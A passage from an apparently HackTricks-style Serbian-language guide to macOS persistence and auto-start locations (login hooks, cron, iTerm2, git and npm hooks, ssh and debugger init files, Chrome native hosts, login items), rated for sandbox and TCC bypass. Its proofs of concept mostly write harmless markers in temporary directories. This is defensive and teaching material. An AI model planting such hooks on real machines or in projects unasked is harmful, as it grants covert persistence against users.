  - Nalazi se u `~/Library/Preferences/com.apple.loginwindow.plist`

Zastareli su, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Ova postavka se čuva u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Da biste ga izbrisali:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Za korisnika root se čuva u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Ovde možete pronaći lokacije za pokretanje korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** i **očekivati ne baš uobičajene uslove**, kao što su instalirani **određeni programi**, „neuobičajene“ radnje korisnika ili okruženja.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Međutim, morate moći da izvršite binarnu datoteku `crontab`
  - Ili morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/usr/lib/cron/tabs/`**
  - Za direktan pristup upisu potrebna su root ovlašćenja. Root nije potreban ako možete da izvršite `crontab <file>`
  - **Okidač**: Raspored u instaliranom crontabu. `at` i `periodic` su zasebni mehanizmi navedeni ispod.

#### Opis i Exploitation

Izlistajte cron poslove **trenutnog korisnika** pomoću:

```bash
crontab -l
```

launchd plist sistemskog cron demona ima stavku `QueueDirectories` za `/usr/lib/cron/tabs`; tu se čuvaju instalirani korisnički crontab fajlovi. Za pregled crontab fajlova drugih korisnika potrebna su root ovlašćenja:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Na privremenom nalogu, korisnički cron unos koji sadrži samo marker može se instalirati pomoću komande `crontab` i ukloniti nakon što ga uočite. Pokretanje komande `crontab <file>` **zamenjuje ceo postojeći crontab naloga**, zato ga sačuvajte i vratite ako nalog nije privremen:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 je ranije imao dodeljene TCC dozvole

#### Lokacije

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Okidač**: Pokrenuti iTerm2 sa odgovarajućom Python API skriptom u tom folderu
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Okidač**: Pokrenuti iTerm2; AppleScript startup hook je dokumentovan zasebno
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Okidač**: Kreirati sesiju sa profilom čija komanda ili početni tekst pokreće payload

#### Opis i eksploatacija

[Trenutni vodič za iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumentuje automatsko pokretanje **Python** skripti u `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Ne potvrđuje da se proizvoljna izvršna `.sh` datoteka u tom folderu pokreće. Za privremeni nalog, sačuvajte ovo kao `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

The [current iTerm2 AppleScript guide](https://iterm2.com/documentation-scripting.html) posebno dokumentuje `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, uz rezervnu legacy putanju `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` kada moderna fascikla ne postoji. AppleScript koji sadrži samo marker je:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Ovi primeri skripti provereni su u odnosu na dokumentaciju za iTerm2, ali nisu pokretani u aktivnoj desktop sesiji. Nakon testiranja na privremenom nalogu, uklonite testnu skriptu i `/tmp/ht-iterm-autolaunch-marker` ili `/tmp/iterm2-autolaunchscpt`, u zavisnosti od slučaja.

Podešavanja iTerm2-a u **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu da navedu komandu profila ili početni tekst. Potonji se unosi u sesiju; njegovo izvršavanje zavisi od toga da li ga shell interpretira. [Dokumentacija za profile iTerm2-a](https://iterm2.com/documentation-preferences-profiles-general.html) opisuje komandu koja se pokreće kada se kreira nova sesija sa tim profilom.

Ovo podešavanje može se konfigurisati u podešavanjima iTerm2-a:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komanda se prikazuje i u podešavanjima:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Za bezbednu procenu pregledajte izabrani profil u podešavanjima aplikacije iTerm2 ili pročitajte kopiju njegove datoteke sa podešavanjima. Promena stavke `Initial Text` u aktivnom profilu uticala bi na sesije korisnika, pa na istraživačkom Mac računaru nije menjano nijedno podešavanje.

### xbar

Opis: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali xbar mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Accessibility

#### Lokacija

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Okidač**: Kada se xbar pokrene

#### Opis

Ako je instaliran popularni program [**xbar**](https://github.com/matryer/xbar), moguće je napisati shell skriptu u direktorijumu **`~/Library/Application\ Support/xbar/plugins/`**, koja će se izvršiti kada se xbar pokrene:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Ali Hammerspoon mora biti instaliran
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Accessibility

#### Lokacija

- **`~/.hammerspoon/init.lua`**
  - **Okidač**: Kada se pokrene hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA scripting language** za svoje operacije. Naročito, podržava integraciju kompletnog AppleScript koda i izvršavanje shell skripti, čime značajno proširuje svoje mogućnosti skriptovanja.<sup>[[13]](#references)</sup>

Aplikacija traži jednu datoteku, `~/.hammerspoon/init.lua`, a skripta se izvršava prilikom pokretanja.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali BetterTouchTool mora biti instaliran
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Automation-Shortcuts i Accessibility

#### Lokacija

- Datoteka skripte na koju se **već upućuje** iz omogućenog BetterTouchTool preseta ili konfiguracija tog preseta u `~/Library/Application Support/BetterTouchTool/`. Tačna putanja skripte zavisi od konfiguracije preseta.

[Referenca za akcije BetterTouchTool-a](https://docs.folivora.ai/docs/actions/action-definitions/) opisuje akcije shell-skripti i pozadinskih komandi. Konfigurisani događaj sa tastature, miša, dodira, vidžeta ili neki drugi događaj mora da se desi dok je relevantni preset aktivan; [vodič za okidače](https://docs.folivora.ai/docs/configuration/new-trigger/) prikazuje kako su oni povezani. Nasumična datoteka u direktorijumu za podršku aplikacije nije okidač. Već konfigurisana akcija koja učitava spoljašnju skriptu sa mogućnošću upisa predstavlja uži cilj za prelazak od upisa do izvršavanja. Kod se izvršava pod korisničkim nalogom BetterTouchTool-a, uz stvarne macOS dozvole koje ima. BetterTouchTool nije bio prisutan u `/Applications` na istraživačkom Mac računaru, pa nijedan preset nije lokalno izmenjen niti izvršen.

### Alfred

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali Alfred mora biti instaliran
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Zahteva dozvole za Automation, Accessibility, pa čak i Full-Disk access

#### Lokacija

- Skripta ili datoteka na koju se **već upućuje** iz instaliranog Alfred workflow-a ili taj workflow u korisnikovom podešenom direktorijumu `Alfred.alfredpreferences`. Direktorijum sa podešavanjima može biti sinhronizovan i ne postoji jedna univerzalna, fiksna putanja.

[Alfred-ov vodič za workflow-e](https://www.alfredapp.com/help/workflows/) opisuje preduslov Powerpack i instalaciju kroz korisnički interfejs. Okidač instaliranog workflow-a — hotkey, ključna reč ili drugi konfigurisani okidač — mora da se aktivira; [Alfred-ov primer hotkey-a](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) prikazuje akciju skripte. [Alfred-ova referenca za okruženje](https://www.alfredapp.com/help/workflows/script-environment-variables/) prikazuje izabranu putanju do podešavanja kroz `alfred_preferences`. Prebacivanje neregistrovane datoteke workflow-a u proizvoljan direktorijum ne dokazuje da će ona biti instalirana ili pokrenuta. Kod se izvršava kao prijavljeni Alfred korisnik, uz stvarne macOS dozvole koje ima. Alfred nije bio prisutan u `/Applications` na istraživačkom Mac računaru, pa je ova putanja procenjena samo na osnovu dokumentacije.

### Raycast Script Commands i osvežavanje ekstenzija

- **Cilj za upis:** Izvršna skripta u direktorijumu koji je **već dodat** u Raycast Settings → Script Commands. Raycast ne pretražuje proizvoljan novokreirani direktorijum. [Raycast-ov vodič za Script Commands](https://manual.raycast.com/script-commands) opisuje registraciju direktorijuma.
- **Okidač i identitet:** Korisnik pokreće indeksiranu komandu, konfigurisani hotkey ili fallback je pokreće, ili Raycast osvežava `inline` skriptu prema njenom podešenom `@raycast.refreshTime`. Skripta se izvršava kao prijavljeni Raycast korisnik preko svog interpreter-a. [Referenca za metapodatke](https://github.com/raycast/script-commands#metadata) ograničava automatsko osvežavanje na inline komande, dok [Raycast-ov manifest ekstenzije](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) zasebno podržava `interval` za instalirane komande ekstenzija `no-view` ili `menu-bar`. Samo dodavanje obične script komande ne zakazuje njeno izvršavanje.

Za jednokratni nalog sa registrovanim direktorijumom skripti, inline skripta koja samo upisuje marker izgleda ovako:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Sačuvajte je u registrovanom direktorijumu, učinite je izvršnom i pustite Raycast da je osveži. Zatim uklonite tu datoteku i `/tmp/ht-raycast-refresh-marker`. Raycast nije pronađen pod uobičajenim imenom u `/Applications` na istraživačkom Mac-u, tako da je ovo potkrepljeno dokumentacijom i nije lokalno pokrenuto. Za Accessibility, Automation i pristup datotekama i dalje mogu biti potrebni macOS upiti za dozvole.

### Automatski zadaci radnog prostora u Visual Studio Code-u

- **Ciljna lokacija za upis:** `.vscode/tasks.json` u radnom prostoru koji će korisnik otvoriti.
- **Okidač:** Otvaranje tog radnog prostora u VS Code-u, ali samo ako je fascikla pouzdana **i** ako su automatski zadaci dozvoljeni. Nepouzdan radni prostor nikad ne pokreće automatske zadatke; podrazumevano podešavanje traži potvrdu korisnika pre prvog automatskog pokretanja. [VS Code dokumentacija o zadacima](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) i [dokumentacija o pouzdanosti radnog prostora](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) opisuju oba uslova.
- **Identitet izvršavanja:** Nalog VS Code korisnika, preko konfigurisanog procesa zadatka. Ovo je izvršavanje specifično za aplikaciju, a ne postojanost pri prijavljivanju.

U **novom, privremenom radnom prostoru**, smestite ovaj zadatak koji samo pravi marker u `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nakon otvaranja pouzdanog workspace-a i dozvoljavanja automatskih zadataka, proverite da li postoji `.autostart-task-ran`. Uklonite unos zadatka i marker radi čišćenja. **Ovo je provereno prema Microsoftovoj dokumentaciji i instaliranom paketu VS Code 1.139.1; nije pokretano u aktivnoj desktop sesiji.**

### Chrome native messaging hosts

- **Ciljna putanja za upis:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` za trenutnog korisnika ili `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` za sve korisnike (potrebna su administratorska prava za upis). Chromium i Chrome for Testing koriste različite direktorijume; pogledajte [aktuelnu tabelu putanja za Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Okidač:** Instalirano Chrome proširenje sa dozvolom `nativeMessaging` poziva `chrome.runtime.connectNative()` ili `chrome.runtime.sendNativeMessage()` koristeći tačan naziv host-a iz manifesta. Chrome zatim pokreće izvršnu datoteku host-a. Samo otvaranje Chrome-a ne izvršava proizvoljan novi native host; kreiranje manifesta bez proširenja koje ga poziva ne radi ništa. [Chrome vodič za native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) opisuje ovo rukovanje.
- **Identitet izvršavanja:** Korisnički nalog u Chrome-u. Manifest mora da navede apsolutnu putanju do izvršne datoteke i da izričito dozvoli origin proširenja koje ga poziva.

U privremenom browser nalogu sa testnim proširenjem, sledeći par datoteka prikazuje vezu između upisa i izvršavanja. Ime datoteke manifesta mora da odgovara njegovom polju `name`, a `TEST_EXTENSION_ID` treba zameniti stvarnim ID-jem tog proširenja:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Sačuvajte ovaj JSON kao `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Izvršna datoteka koja služi samo kao marker, navedena u polju `path` manifesta, može da sadrži:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nakon što testno proširenje pozove `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` iz svog service worker-a ili stranice proširenja, marker potvrđuje da je host pokrenut. Ovaj minimalni host ne implementira Chrome-ov protokol odgovora sa prefiksom dužine, pa proširenje može prijaviti grešku u razmeni poruka nakon što se marker upiše. Uklonite testni manifest, host i marker radi čišćenja. Na macOS 26.5.2 aplikacija Chrome i oba direktorijuma manifesta bili su prisutni; **aktivni Chrome profil nije menjan niti korišćen**.

### Komande za događaje tastera u Karabiner-Elements

- **Cilj upisa:** `~/.config/karabiner/karabiner.json` na korisničkom nalogu na kojem je Karabiner-Elements instaliran i pokrenut. [Karabiner-ov vodič za lokaciju datoteke](https://karabiner-elements.pqrs.org/docs/json/location/) navodi da aplikacija nadgleda ovu datoteku i ponovo je učitava nakon upisa. JSON datoteke u `assets/complex_modifications` samo su unapred pripremljena pravila koja se mogu uvesti; samo upisivanje datoteke tamo ne aktivira pravilo.
- **Okidač:** Konfigurisani događaj tastera nakon aktiviranja pravila. Referenca za [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) dokumentuje izvršavanje komandi. Ovo nije izvršavanje koda pri prijavi niti pri svakom upisu u datoteku.
- **Identitet izvršavanja:** Prijavljeni korisnik koji pokreće Karabiner-ov korisnički proces. Dozvole koje mu je dodelio sam korisnik i svaki TCC pristup zavise od aplikacije i verzije.

Za jednokratni testni nalog dodajte ovaj objekat pravila u niz `complex_modifications.rules` izabranog profila u `karabiner.json`, a ostatak profila sačuvajte. Pritisnite F18 da biste napravili bezopasan marker, a zatim uklonite ovo pravilo i marker. Izborom tastera F18 izbegava se zamena uobičajenog tastera za kucanje:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements nije bio instaliran u `/Applications` na testnoj mašini sa macOS 26.5.2, pa je ovo PoC zasnovan na dokumentaciji, a ne rezultat lokalnog izvršavanja.

### Git hooks u lokalnom repozitorijumu

- **Ciljna lokacija za upis:** Izvršna skripta hook-a, kao što je `<repo>/.git/hooks/post-checkout`. Ako je `core.hooksPath` već podešen, umesto toga koristite taj konfigurisani direktorijum. Hook koji je dodat kao obična praćena izvorna datoteka ne instalira se automatski u klon.
- **Okidač:** Odgovarajuća Git operacija. Na primer, `post-checkout` se pokreće nakon `git checkout` ili `git switch`, a može se pokrenuti i nakon kloniranja ili kreiranja worktree-a. [Git's hook reference](https://git-scm.com/docs/githooks) navodi događaje i zahtev za izvršnim bitom; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) menja direktorijum u kojem se hook traži.
- **Identitet izvršavanja:** Nalog koji pokreće Git. Hook može da se izvrši samo ako akter ima dozvolu za pisanje u efektivni direktorijum hooks-a repozitorijuma, a korisnik kasnije izvrši odgovarajuću Git operaciju.

Ovaj PoC koji postavlja samo marker kreira potpuno privremen repozitorijum, instalira jedan hook i prebacuje se na drugu granu. Uspešno je izvršen uz Apple Git 2.50.1 na macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle skripte u projektu

- **Cilj upisa:** Mapa `scripts` u datoteci `package.json` projekta u koji je moguće upisivati ili u paketu instalirane zavisnosti čiju će lifecycle skriptu korisnik pokrenuti. Ovo je kuka za razvojni tok rada, a ne izvršavanje pri otvaranju direktorijuma.
- **Okidač i identitet:** Kasniji `npm install` ili `npm ci`, ako su lifecycle skripte dozvoljene, pokreće `preinstall`, `install` i `postinstall` kao korisnik koji je pozvao npm. Obična komanda `npm run <name>` takođe pokreće odgovarajuće skripte `pre<name>` i `post<name>`. [npm-ova referenca za lifecycle](https://docs.npmjs.com/cli/v11/using-npm/scripts) navodi događaje; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) može da spreči pokretanje install lifecycle skripti. Verzija i podešavanja smernica mogu da utiču na to šta je dozvoljeno, zato proverite ciljnu verziju npm-a.

Ovaj PoC koji samo postavlja marker pokrenut je pomoću lokalnog npm-a u praznom, privremenom direktorijumu. Ne preuzima zavisnosti niti menja projekat korisnika:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Ovo se razlikuje od Python interpreter startup files: npm mora da izvrši odgovarajuću instalaciju ili radnju pokretanja, dok Python `site` kod može da se učita pri običnom pozivanju interpretera. Generički ciljevi `Makefile` i definicije build zadataka takođe zahtevaju da korisnik ili već konfigurisan alat pozove taj cilj; oni nisu zasebni OS putevi za automatsko pokretanje.

### Konfiguracija pokretanja Vim-a

- **Ciljna lokacija za upis:** `~/.vimrc` za korisnika koji će pokrenuti Vim (ili druga startup datoteka izabrana prema redosledu inicijalizacije Vim-a). [Referenca za pokretanje Vim-a](https://vimhelp.org/starting.txt.html) dokumentuje datoteku i override opcije `VIMINIT`/`EXINIT`.
- **Okidač:** Naredno uobičajeno pokretanje Vim-a koje učitava ovu konfiguraciju. Vim opcija `-u NONE` zaobilazi korisnički vimrc. Ovo je izvršavanje specifično za editor, a ne OS okidač za prijavu.
- **Identitet izvršavanja:** Nalog korisnika Vim-a.

Sledeći izolovani PoC pokrenut je na macOS `/usr/bin/vim`; ne upisuje stvarne Vim postavke niti otvorene dokumente:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ima zasebnu putanju za korisničku konfiguraciju, `$XDG_CONFIG_HOME/nvim/init.lua` ili `init.vim`, a takođe učitava skripte iz svojih `plugin/` runtime direktorijuma, prema [dokumentaciji o pokretanju](https://neovim.io/doc/user/starting/). Neovim nije bio instaliran na testnoj mašini sa macOS 26.5.2, pa ova varijanta tamo nije pokrenuta.

### SSH client configuration commands

- **Odredište upisa:** `~/.ssh/config` ili druga datoteka koju ona već uključuje. Ovo je konfiguraciona datoteka za **klijenta**; odvojena je od serverske `~/.ssh/rc` opisane u nastavku.
- **Okidač:** Odgovarajuće pokretanje komande `ssh`. `Match exec` pokreće lokalnu komandu dok klijent obrađuje svoju konfiguraciju, čak i uz `ssh -G`, koji ispisuje konfiguraciju bez povezivanja. `ProxyCommand` se pokreće kada klijent uspostavlja odgovarajuću vezu. `LocalCommand` se pokreće tek nakon uspešnog povezivanja i zahteva `PermitLocalCommand yes` (podrazumevana vrednost je `no`). Ovo se razlikuje po trenutku pokretanja i preduslovima; samo upisivanje ne pokreće ove komande. Pogledajte upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Identitet izvršavanja:** Lokalni korisnik koji pokreće `ssh`. Potrebni su odgovarajući host, primenljiva konfiguraciona datoteka i svaka neophodna veza. `ssh -F` može da izabere drugu konfiguracionu datoteku.

Ovaj PoC, koji samo pravi marker, pokrenut je uz Apple-ov SSH klijent na macOS 26.5.2. `-G` proverava `Match exec` bez uspostavljanja mrežne veze ili čitanja stvarne SSH konfiguracije korisnika:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Datoteke za inicijalizaciju debugger-a

- **Ciljna datoteka za upis:** `~/.lldbinit` ili datoteka specifična za aplikaciju sa višim prioritetom, kao što je `~/.lldbinit-lldb`. LLDB čita jednu datoteku pri pokretanju debugger-a. `.lldbinit` iz trenutnog direktorijuma se **ne** izvršava podrazumevano; korisnik mora da omogući `target.load-cwd-lldbinit` ili prosledi `--local-lldbinit`. Pogledajte [LLDB manual](https://lldb.llvm.org/man/lldb.html).
- **Okidač i identitet:** Korisnik pokreće LLDB bez `--no-lldbinit`; komande se izvršavaju kao taj korisnik. Samo otvaranje projekta ne znači da će se izvršiti njegov `.lldbinit`.

Sledeći test, koji koristi samo marker, pokrenut je u LLDB-u na macOS 26.5.2, sa izolovanim home direktorijumom i radnim direktorijumom:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Za **GDB**, [upstream dokumentacija za pokretanje](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) navodi `$HOME/Library/Preferences/gdb/gdbinit`, a zatim `~/.gdbinit` na macOS-u. `.gdbinit` u trenutnom direktorijumu podleže [putanji bezbednoj za automatsko učitavanje](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), a `-nx`/`-nh` potiskuju datoteke za inicijalizaciju. GDB nije bio instaliran na testnom Mac-u, pa ova varijanta nije lokalno isprobana.

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali ssh mora biti omogućen i korišćen
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - SSH upotreba ima FDA pristup

#### Lokacija

- **`~/.ssh/rc`**
  - **Okidač**: Prijava putem ssh-a
- **`/etc/ssh/sshrc`**
  - Potreban je root
  - **Okidač**: Prijava putem ssh-a

> [!CAUTION]
> Za uključivanje ssh-a potreban je pun pristup disku:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i eksploatacija

Podrazumevano, osim ako je u `/etc/ssh/sshd_config` navedeno `PermitUserRC no`, skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** izvršavaju se kada se korisnik **prijavi putem SSH-a**.<sup>[[14]](#references)</sup>

### **Stavke za prijavu**

Opis: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate da izvršite `osascript` sa argumentima
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **Registrovana pomoćna aplikacija za stavke za prijavu:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (uobičajena lokacija u paketu).
  - **Okidač:** Registracija može odmah da pokrene pomoćnu aplikaciju; ona se zatim pokreće pri narednim prijavama korisnika, uz odobrenje.
- **Registrovani agent/daemon u paketu:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` ili `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Okidač:** Odobreni agent može da se pokrene pri registraciji i pri narednim prijavama; odobreni daemon pokreće se pri podizanju sistema. Daemon zahteva odobrenje administratora.

#### Opis

U **System Settings → General → Login Items & Extensions** korisnici mogu da pregledaju stavke za prijavu i pozadinske stavke. macOS 13 i novije verzije pružaju [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) za registrovanje stavki za prijavu, launch agent-a i launch daemon-a koji su deo paketa. Ponašanje metode [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) razlikuje se u zavisnosti od tipa i stanja odobrenja. **Upisivanje pomoćne aplikacije u paket aplikacije nije dovoljno da bi se registrovala nova stavka za prijavu.** Obrnuto, ako je izvršna datoteka već registrovane pomoćne aplikacije upisiva, njena izmena može da utiče na sledeće pokretanje bez nove registracije; prvo proverite stvarnu putanju i provere potpisivanja koda.

Sledeći postupak omogućava pregled pomoćnih aplikacija u paketima na Mac-u samo za čitanje; ne registruje ih niti pokreće:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Za launch plist unutar bundle-a, razrešite `BundleProgram` **u odnosu na koren app bundle-a** (na primer `Contents/MacOS/Helper`), kako je navedeno u [Apple-ovim smernicama za migraciju Service Management-a](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Inventar direktorijuma `/Applications` samo za čitanje na istraživačkom Mac-u pronašao je 14 stavki pomoćnih programa u bundle-ovima i pet deklaracija `BundleProgram`; svih pet odredišta je razrešeno, a dve su prošle proveru upisivosti od strane korisnika. Ta provera **ne** potvrđuje da je bilo koji od ta dva pomoćna programa registrovan, omogućen, izvršiv nakon validacije potpisa ili dostupan iz sandbox-a. `sfltool dumpbtm` je prikazao 150 imenovanih zapisa na ovom Mac-u; to je pomoćno sredstvo za pregled, a ne test kojim se utvrđuje da li je svaki zapis pokrenut.

Starijim login items takođe se može upravljati putem Apple events. Moguće ih je izlistati, dodati i ukloniti iz komandne linije, mada dodavanje menja trajnu konfiguraciju prijavljivanja korisnika i može zahtevati odobrenje za Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

